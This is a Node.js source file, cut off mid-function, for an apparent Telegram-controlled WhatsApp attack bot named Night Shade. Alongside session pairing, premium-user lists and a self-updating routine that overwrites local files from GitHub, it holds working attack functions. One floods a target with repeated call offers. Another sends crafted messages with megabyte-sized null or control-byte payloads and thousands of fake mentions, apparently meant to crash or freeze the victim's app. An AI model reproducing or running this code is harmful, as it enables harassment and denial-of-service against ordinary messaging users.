;const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('xatabail');
const fs = require("fs-extra");
const P = require("pino");
const pino = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync('./lib/thumb.jpeg');
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cd = "cooldown.json";
const axios = require("axios");
const { exec } = require("child_process");
const chalk = require("chalk"); 
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const moment = require('moment');
const BOT_TOKEN = config.BOT_TOKEN;
const OWNER_ID = config.OWNER_ID;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const ONLY_FILE = "only.json";
const developerId = OWNER_ID
const developerIds = [developerId, "8246978365", "7852968912"]; 
const kontolmedia = fs.readFileSync('./lib/thumb.jpeg')
const GH_OWNER = "PadukaJoyyy";
const GH_REPO = "autoupdateq";
const GH_BRANCH = "main";


const GROUP_ID_FILE = 'group_ids.json';//untuk menyimpan yang hanya di izinkan atau tidak di group kamu seperti /addgroup /delgroup

// Fungsi untuk memeriksa apakah bot diizinkan untuk beroperasi di grup tertentu
function isGroupAllowed(chatId) {
  try {
    const groupIds = JSON.parse(fs.readFileSync(GROUP_ID_FILE, 'utf8'));
    return groupIds.includes(String(chatId));
  } catch (error) {
    console.error('Error membaca file daftar grup:', error);
    return false;
  }
}

// file db
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/PadukaJoyyy/NightShade/refs/heads/main/Database.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    if (Array.isArray(response.data.tokens)) {
      return response.data.tokens; // ambil dari object 'tokens'
    } else {
      console.error(chalk.red("❌ Format data di GitHub salah! Key 'tokens' harus array"));
      return [];
    }
  } catch (error) {
    console.error(chalk.red("ʟᴜ sᴘ anjir🤭😹😹, ᴛᴏᴋᴇɴ ʟᴜ ʟᴏᴍ ᴋᴇᴅᴀғᴛᴀʀ ᴅɪ ᴅʙ ᴍɪɴᴛᴀ sᴇʟʟᴇʀ ʟᴜ ᴋᴀʟᴏ ʟᴜ bel😹😹:", error.message));
    return [];
  }
}

// Validasi token
async function validateToken() {
  console.log(chalk.yellow("⏳ Loading Check Token Bot..."));

  const validTokens = await fetchValidTokens();

  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ ʟᴜ sɪᴀᴘᴀ ᴋᴏɴᴛᴏʟ ᴍᴀᴜ ɴɢᴇᴄʀᴀᴄᴋ ʏᴀ?! 😹😹"));
    process.exit(1);
  }

  console.log(chalk.green("✅ ᴋᴇʟᴀᴢ ʟᴇᴋ ᴛᴏᴋᴇɴᴍᴜ ᴍᴀsᴜᴋ ᴅɪ ᴅʙ"));
  startBot();
}

// Fungsi startBot kalau token valid
function startBot() {
  console.log(chalk.red(`
⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣶⣿⣶⡾⠁
⠠⣿⡀⠀⠀⠀⢀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀
⠀⠙⢿⣶⣶⣾⣿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠿⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⢿⣿⣿⠟⠁⠀⠀⠀⠈⢿⣿⠛⠻⢿⣦⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⠟⠁⠘⢿⣿⠀⠀⠀⠀⠀⠀⠸⣿⡀⠀⠀⠹⠷⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣤⠀⠀⠀⠙⠷⠶⠀⠀⠀⠀⠀⠙⠛⠁⠀⠀⠀

╭━╍╾─「 ɴɪɢʜᴛ ꜱʜᴀᴅᴇ 」─╼╍━╮
║ɴᴀᴍᴇ   : ɴɪɢʜᴛ ꜱʜᴀᴅᴇ
║ᴠᴇʀsɪᴏɴ : 12.0.0 Auto Update
╰━╍╾───────────╼╍━╯
`));
}

validateToken();

// Fungsi untuk menambahkan grup ke daftar yang diizinkan
function addGroupToAllowed(chatId) {
  try {
    const groupIds = JSON.parse(fs.readFileSync(GROUP_ID_FILE, 'utf8'));
    if (groupIds.includes(String(chatId))) {
      bot.sendMessage(chatId, 'Grup ini sudah diizinkan.');
      return;
    }
    groupIds.push(String(chatId));
    setAllowedGroups(groupIds);
    bot.sendMessage(chatId, 'Grup ditambahkan ke daftar yang diizinkan.');
  } catch (error) {
    console.error('Error menambahkan grup:', error);
    bot.sendMessage(chatId, 'Terjadi kesalahan saat menambahkan grup.');
  }
}

// Fungsi Auto Update Script
async function downloadRepo(dir = "", basePath = "/home/container") {
    const apiURL = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${dir}?ref=${GH_BRANCH}`;

    const { data } = await axios.get(apiURL, {
        headers: { "User-Agent": "Mozilla/5.0" }
    });

    for (const item of data) {
        const localPath = path.join(basePath, item.path);

        if (item.type === "file") {
            const fileResp = await axios.get(item.download_url, {
                responseType: "arraybuffer"
            });

            fs.mkdirSync(path.dirname(localPath), { recursive: true });
            fs.writeFileSync(localPath, Buffer.from(fileResp.data));

            console.log(`[UPDATE] ${localPath}`);
        }

        if (item.type === "dir") {
            fs.mkdirSync(localPath, { recursive: true });
            await downloadRepo(item.path, basePath);
        }
    }
}

// Fungsi untuk menghapus grup dari daftar yang diizinkan
function removeGroupFromAllowed(chatId) {
  try {
    let groupIds = JSON.parse(fs.readFileSync(GROUP_ID_FILE, 'utf8'));
    groupIds = groupIds.filter(id => id !== String(chatId));
    setAllowedGroups(groupIds);
    bot.sendMessage(chatId, 'Grup dihapus dari daftar yang diizinkan.');
  } catch (error) {
    console.error('Error menghapus grup:', error);
    bot.sendMessage(chatId, 'Terjadi kesalahan saat menghapus grup.');
  }
}

// Fungsi untuk mengatur daftar ID grup yang diizinkan
function setAllowedGroups(groupIds) {
  const config = groupIds.map(String);
  fs.writeFileSync(GROUP_ID_FILE, JSON.stringify(config, null, 2));
}

// Fungsi untuk memeriksa apakah hanya grup yang diizinkan
function isOnlyGroupEnabled() {
  const config = JSON.parse(fs.readFileSync(ONLY_FILE));
  return config.onlyGroup || false; // Mengembalikan false jika tidak ada konfigurasi
}

// Fungsi untuk mengatur status hanya grup
function setOnlyGroup(status) {
  const config = { onlyGroup: status };
  fs.writeFileSync(ONLY_FILE, JSON.stringify(config, null, 2));
}

// Fungsi untuk menentukan apakah pesan harus diabaikan
function shouldIgnoreMessage(msg) {
  if (!msg.chat || !msg.chat.id) return false;
  if (isOnlyGroupEnabled() && msg.chat.type !== "group" && msg.chat.type !== "supergroup") {
    return msg.chat.type === "private" && !isGroupAllowed(msg.chat.id);
  } else {
    return !isGroupAllowed(msg.chat.id) && msg.chat.type !== "private";
  }
}


const groupSettingsPath = './database/group-settings.json';
// Load atau inisialisasi pengaturan grup
let groupSettings = {};
if (fs.existsSync(groupSettingsPath)) {
  groupSettings = JSON.parse(fs.readFileSync(groupSettingsPath));
}

// Simpan pengaturan grup ke file
const saveGroupSettings = () => {
  fs.writeFileSync(groupSettingsPath, JSON.stringify(groupSettings, null, 2));
};

let premiumUsers = JSON.parse(fs.readFileSync('./database/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./database/admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./database/premium.json');
ensureFileExists('./database/admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./database/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./database/admin.json', JSON.stringify(adminUsers, null, 2));
}

function isExpired(dateStr) {
  const now = new Date();
  const exp = new Date(dateStr);
  return now > exp;
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./database/premium.json', (data) => (premiumUsers = data));
watchFile('./database/admin.json', (data) => (adminUsers = data));


const bot = new TelegramBot(BOT_TOKEN, { polling: true });

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(chalk.yellow(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`));

      for (const botNumber of activeNumbers) {
        console.log(chalk.blue(`Mencoba menghubungkan WhatsApp: ${botNumber}`));
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(chalk.green(`Bot ${botNumber} Connected 🔥️!`));
              
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(chalk.red(`Mencoba menghubungkan ulang bot ${botNumber}...`));
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`ᴘʀᴏsᴇs ᴘᴀɪʀɪɴɢ ʙᴀɴɢ... ${botNumber}.....\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`ɴɪʜ ʟᴀɢɪ ᴏᴛᴡ ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`sᴀʙᴀʀ ʙᴀɴɢ, ᴋᴏᴋ ᴇʀᴏʀ?? ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`ɴᴀʜ ᴛᴜʜ ᴜᴅᴀʜ ʙɪsᴀ ʙᴀɴɢ ${botNumber}.....sᴇʟᴀᴍᴀᴛ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ sᴄʀɪᴘᴛ\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`sᴜᴄᴄᴇs ᴘᴀɪʀɪɴɢ\`\`\`
ᴛᴜʜ ᴄᴏᴅᴇ ʟᴜ ᴘᴀsᴀɴɢ ɢᴇᴄᴇʜ: ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`ɢᴏʙʟᴏᴄᴋ, ᴋᴏᴋ ɢᴀɢᴀʟ sɪ? ${botNumber}.....\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

// -------( Fungsional Function Before Parameters )--------- \\
// ~Bukan gpt ya kontol

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}


function getRandomImage() {
  const images = [
        "https://ibb.co.com/bMFJgwG6" // ini gak di gunain si
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldowwn 

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return "✅";
  } else {
    return "❌";
  }
}

const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "⚡";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "🔥";
        return true;
    } else {
        Premiumataubukan = "⚡";
        return false;
    }
};

const checkPremium = async (ctx, next) => {
    if (isPremiumUser(ctx.from.id)) {
        await next();
    } else {
        await ctx.reply("❌ Maaf Anda Bukan Owner");
    }
};

//====================DI BAWAH SINI ISI FUNCTION ELU==============================\\
// ~ ( FORCLOSE CALL PERMANEN ) ~ \\

async function SpamcallFcPermanen(sock, jid) {
    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("xatabail");
    const crypto = require("crypto");
    const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
    let devices = (
        await sock.getUSyncDevices([jid], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
    await sock.assertSessions(devices);
    let xnxx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch {}
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = sock.createParticipantNodes.bind(sock);
    let yntkts = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);

        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = sock.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;
        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {
                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

                let bytes = bokep(
                    yntkts ? yntkts(msg) : encodeWAMessage(msg)
                );
                return memek.mutex(jid, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });
                    if (type === "pkmsg") shouldIncludeDeviceIdentity = true;

                    return {
                        tag: "to",
                        attrs: { jid },
                        content: [{
                            tag: "enc",
                            attrs: { v: "2", type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );
        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };
    const startTime = Date.now();
    const duration = 1 * 60 * 1000;
    while (Date.now() - startTime < duration) {
        const callId = crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase();
        let {
            nodes: destinations,
            shouldIncludeDeviceIdentity
        } = await sock.createParticipantNodes(
            devices,
            { conversation: "y" },
            { count: "0" }
        );
        const callOffer = {
            tag: "call",
            attrs: {
                to: jid,
                id: sock.generateMessageTag(),
                from: sock.user.id
            },
            content: [{
                tag: "offer",
                attrs: {
                    "call-id": callId,
                    "call-creator": sock.user.id
                },
                content: [
                    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                    { tag: "video", attrs: { orientation: "0", screen_width: "1920", screen_height: "1080", device_orientation: "0", enc: "vp8", dec: "vp8" } },
                    { tag: "net", attrs: { medium: "3" } },
                    { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                    { tag: "encopt", attrs: { keygen: "2" } },
                    { tag: "destination", attrs: {}, content: destinations },
                    ...(shouldIncludeDeviceIdentity ? [{ tag: "device-identity", attrs: {}, content: encodeSignedDeviceIdentity(sock.authState.creds.account, true) }] : [])
                ]
            }]
        };
        
        await sock.sendNode(callOffer);
        await sleep(1000);
        const callTerminate = {
            tag: "call",
            attrs: {
                to: jid,
                id: sock.generateMessageTag(),
                from: sock.user.id
            },
            content: [{
                tag: "terminate",
                attrs: {
                    "call-id": callId,
                    "reason": "REJECTED",
                    "call-creator": sock.user.id
                },
                content: []
            }]
        };
        
        await sock.sendNode(callTerminate);
        await sleep(1000);
    }
    console.log("Done");
}

// ~ ( DELAY HARD INVISIBLE ) ~ \\

async function invisSpam(sock, jid) {
    const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];

    for (const x of type) {
        const enty = Math.floor(Math.random() * type.length);
        const msg = generateWAMessageFromContent(
            jid,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "\u0003",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: x,
                                paramsJson: "\x10".repeat(1000000),
                                version: 3
                            },
                            entryPointConversionSource: type[enty]
                        }
                    }
                }
            },
            {
                participant: { jid: jid }
            }
        );
        await sock.relayMessage(
            jid,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            {
                messageId: msg.key.id,
                participant: { jid: jid }
            }
        );
        await new Promise(resolve => setTimeout(resolve, 1000));
    }

    const mediaDatamrb = [
        {
            ID: "68BD677B",
            uri: "t62.43144-24/10000000_1407285833860834_2249780575933148603_n.enc?ccb=11-4&oh",
            buffer: "01_Q5Aa2AFffQpqWVK7GvldUiQQNd4Li_6BbUMZ3yHwZ55g5SuVKA&oe",
            sid: "5e03e0",
            SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
            ENCSHA256: "o+hchsgN0ZtdSp8iBlD1Yb/kx9Mkrer8km3pw5azkj0=",
            mkey: "C+7Uy3QyEAHwMpIR7CGaKEhpZ3KYFS67TcYxcNbm73EXo="
        },
        {
            ID: "68BD469B",
            uri: "t62.43144-24/10000000_2553936021621845_4020476590210043024_n.enc?ccb=11-4&oh",
            buffer: "01_Q5Aa2AHPt6cTL57bihyVMMppUvQiXg-m7Oog3TAebzRVWsCNEw&oe",
            sid: "5e03e0",
            SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
            ENCSHA256: "2cGzUZDAYCZq7QbAoiWSI1h5Z0WIje7VK1IiUgqu/+Y=",
            mkey: "1EvzGhM2IL78wiXyfpRrcr8o0ws/hTjtghBQUF+v3wI="
        }
    ];

    let sequentialIndexmrb = 0;

    try {
        if (!sock || !sock.user) {
            throw new Error("Socket tidak terrekasi!");
        }

        console.log(chalk.green(`🚀 Memulai serangan Luldel ke ${targetNumber}`));

        let successCount = 0;
        let errorCount = 0;

        for (let i = 0; i < 3; i++) {
            try {
                if (!sock || !sock.user) {
                    throw new Error("Socket putus koneksi selama serangan!");
                }

                const selectedMedia = mediaDatamrb[sequentialIndexmrb];
                sequentialIndexmrb = (sequentialIndexmrb + 1) % mediaDatamrb.length;

                const MD_ID = selectedMedia.ID;
                const MD_Uri = selectedMedia.uri;
                const MD_Buffer = selectedMedia.buffer;
                const MD_SID = selectedMedia.sid;
                const MD_sha256 = selectedMedia.SHA256;
                const MD_encsha25 = selectedMedia.ENCSHA256;
                const mkey = selectedMedia.mkey;

                let parse = true;
                let type = "image/webp";
                if (11 > 9) {
                    parse = parse ? false : true;
                }

                let stickerMessage = {
                    viewOnceMessage: {
                        message: {
                            stickerMessage: {
                                url: `https://mmg.whatsapp.net/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}&mms3=true`,
                                fileSha256: Buffer.from(MD_sha256, "base64"),
                                fileEncSha256: Buffer.from(MD_encsha25, "base64"),
                                mediaKey: Buffer.from(mkey, "base64"),
                                mimetype: type,
                                directPath: `/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}`,
                                fileLength: {
                                    low: Math.floor(Math.random() * 1000),
                                    high: 0,
                                    unsigned: true
                                },
                                mediaKeyTimestamp: {
                                    low: Math.floor(Math.random() * 1700000000),
                                    high: 0,
                                    unsigned: false
                                },
                                firstFrameLength: 19904,
                                firstFrameSidecar: "KN4kQ5pyABRAgA==",
                                isAnimated: true,
                                contextInfo: {
                                    participant: jid,
                                    mentionedJid: [
                                        "0@s.whatsapp.net",
                                        ...Array.from(
                                            { length: 1998 },
                                            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                        )
                                    ],
                                    groupMentions: [],
                                    entryPointConversionSource: "non_contact",
                                    entryPointConversionApp: "whatsapp",
                                    entryPointConversionDelaySeconds: 467593
                                },
                                stickerSentTs: {
                                    low: Math.floor(Math.random() * -20000000),
                                    high: 555,
                                    unsigned: parse
                                },
                                isAvatar: parse,
                                isAiSticker: parse,
                                isLottie: parse
                            }
                        }
                    }
                };

                let interactiveMessage = {
                    viewOnceMessage: {
                        message: {
                            interactiveResponseMessage: {
                                body: {
                                    text: "蟽骗伪讗 搔伪喙€",
                                    format: "DEFAULT"
                                },
                                nativeFlowResponseMessage: {
                                    name: "call_permission_request",
                                    paramsJson: "\u0000".repeat(1045000),
                                    version: 3
                                },
                                entryPointConversionSource: "galaxy_message"
                            }
                        }
                    }
                };

                let galaxyMessage = {
                    viewOnceMessage: {
                        message: {
                            interactiveResponseMessage: {
                                body: {
                                    text: "喙弔喔勛 蟼喙徯逞",
                                    format: "DEFAULT"
                                },
                                nativeFlowResponseMessage: {
                                    name: "galaxy_message",
                                    paramsJson: "\x10".repeat(1045000),
                                    version: 3
                                },
                                entryPointConversionSource: "call_permission_request"
                            }
                        }
                    }
                };

                let textMessage = {
                    extendedTextMessage: {
                        text: "驴" + "軎".repeat(300000),
                        contextInfo: {
                            participant: jid,
                            mentionedJid: [
                                jid,
                                ...Array.from(
                                    { length: 2000 },
                                    () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                                )
                            ]
                        }
                    }
                };

                const messages = [stickerMessage, interactiveMessage, galaxyMessage, textMessage];

                for (const msgContent of messages) {
                    const msg = generateWAMessageFromContent(jid, msgContent, {});
                    await sock.relayMessage(
                        "status@broadcast",
                        msg.message,
                        {
                            messageId: msg.key.id,
                            statusJidList: [jid],
                            additionalNodes: [
                                {
                                    tag: "meta",
                                    attrs: {},
                                    content: [
                                        {
                                            tag: "mentioned_users",
                                            attrs: {},
                                            content: [
                                                {
                                                    tag: "to",
                                                    attrs: { jid: jid },
                                                    content: undefined
                                                }
                                            ]
                                        }
                                    ]
                                }
                            ]
                        }
                    );
                }

                successCount++;

                const percent = ((i + 1) / 3) * 100;
                console.log(
                    chalk.red(
                        `Mengirim Luldel ke ${targetNumber.replace("@s.whatsapp.net", "")}\nProses: (${percent.toFixed(2)}%)`
                    )
                );
            } catch (batchError) {
                errorCount++;
                console.error(chalk.red(`❌ Batch ${i + 1}/3 GAGAL: ${batchError.message}`));
                if (errorCount > 3) {
                    console.error(chalk.red("⚠️ Terlalu banyak kesalahan, menghentikan serangan!"));
                    break;
                }
            }

            if (i < 2) {
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        console.log(chalk.green(`✓ ${successCount}/3`) + chalk.red(` ✗ ${errorCount}/3`));

        try {
            const lastMsg = generateWAMessageFromContent(
                jid,
                {
                    viewOnceMessage: {
                        message: {
                            stickerMessage: {
                                url: `https://mmg.whatsapp.net/v/${mediaDatamrb[0].uri}`,
                                fileSha256: Buffer.from(mediaDatamrb[0].SHA256, "base64"),
                                fileEncSha256: Buffer.from(mediaDatamrb[0].ENCSHA256, "base64"),
                                mediaKey: Buffer.from(mediaDatamrb[0].mkey, "base64"),
                                mimetype: "image/webp"
                            }
                        }
                    }
                },
                {}
            );

            await sock.relayMessage(
                jid,
                {
                    groupStatusMentionMessage: {
                        message: {
                            protocolMessage: {
                                key: lastMsg.key,
                                type: 25
                            }
                        }
                    }
                },
                {
                    additionalNodes: [
                        {
                            tag: "meta",
                            attrs: {
                                is_status_mention: " Luldel - serangan "
                            },
                            content: undefined
                        }
                    ]
                }
            );
            console.log(chalk.green("✅ Pesan menyebutkan berhasil dikirim"));
        } catch (mentionError) {
            console.error(chalk.red(`❌ gagal: ${mentionError.message}`));
        }

        return { success: true, successCount, errorCount };
